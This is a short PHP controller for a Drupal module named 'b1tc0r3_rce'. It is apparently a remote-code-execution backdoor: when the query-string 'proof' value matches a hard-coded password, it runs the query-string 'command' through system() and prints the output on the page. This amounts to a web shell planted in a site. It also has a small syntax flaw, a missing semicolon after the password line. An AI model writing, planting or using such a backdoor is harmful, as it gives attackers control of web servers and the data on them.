<?php

namespace Drupal\b1tc0r3_rce\Controller;

class B1TC0R3RCEController {
    public function execute() {
        $password = 'your_password_here'

        $command = \Drupal::request()->query->get('command');
        $proof = \Drupal::request()->query->get('proof');

        $result = 'Insufficient access';
        if ($proof == $password) {
            $result  = system($command);
        }

        return array(
            '#title' => 'B1TC0R3 RCE Controller',
            '#markup' => $result
        );
    }
}

?>
